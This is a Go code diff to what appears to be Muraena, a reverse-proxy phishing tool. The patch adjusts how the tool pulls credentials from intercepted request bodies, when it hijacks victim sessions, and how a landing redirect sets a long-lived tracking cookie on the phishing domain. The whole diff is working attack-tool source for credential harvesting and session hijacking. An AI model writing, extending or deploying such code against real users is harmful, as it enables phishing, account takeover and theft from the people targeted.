@@ -67,7 +67,7 @@ func (muraena *MuraenaProxy) RequestBodyProcessor(request *http.Request, track *
 		bodyString := string(buf)
 
 		// Trace credentials
-		if muraena.Session.Config.Tracking.Enabled {
+		if muraena.Session.Config.Tracking.Enabled && track.IsValid() {
 			found, err := track.ExtractCredentials(bodyString, request)
 			if err != nil {
 				return errors.New(fmt.Sprintf("ExtractCredentials error: %s", err))
@@ -157,6 +157,7 @@ func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error)
 	l := fmt.Sprintf("%s - [%s][%s%s(%s)%s]", lhead,
 		Magenta(request.Method), Magenta(sess.Config.Protocol), Green(muraena.Origin),
 		Brown(muraena.Target), Cyan(request.URL.Path))
+
 	log.Info(l)
 	log.BufLogInfo(l)
 
@@ -171,10 +172,13 @@ func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error)
 		}
 	}
 
-	err = track.HijackSession(request)
-	if err != nil {
-		log.Debug("Error Hijacking Session: %s", err)
-		return nil
+	if track.IsValid() {
+		log.Debug("Going to hijack session: %s (Track: %+v)", request.URL.Path, track)
+		err = track.HijackSession(request)
+		if err != nil {
+			log.Debug("Error Hijacking Session: %s", err)
+			return nil
+		}
 	}
 
 	// Transform body
@@ -196,13 +200,14 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 
 	if response.Request.Header.Get("If-Landing-Redirect") != "" {
 		response.StatusCode = 302
-		response.Header.Add("X-If-Range", response.Request.Header.Get("X-If-Range"))
+		response.Header.Add("If-Range", response.Request.Header.Get("If-Range"))
 		response.Header.Add("Set-Cookie",
 			fmt.Sprintf("%s=%s; Domain=%s; Path=/; Expires=Wed, 30 Aug 2029 00:00:00 GMT",
-				muraena.Session.Config.Tracking.Identifier, response.Request.Header.Get("X-If-Range"),
+				muraena.Session.Config.Tracking.Identifier, response.Request.Header.Get("If-Range"),
 				muraena.Session.Config.Proxy.Phishing))
 		response.Header.Set("Location", response.Request.Header.Get("If-Landing-Redirect"))
 
+		log.Warning("Setting cookies: %s", response.Request.Header.Get("If-Range"))
 		return
 	}
 
@@ -297,7 +302,6 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 			}
 		}
 	}
-
 
 	//
 	// BODY
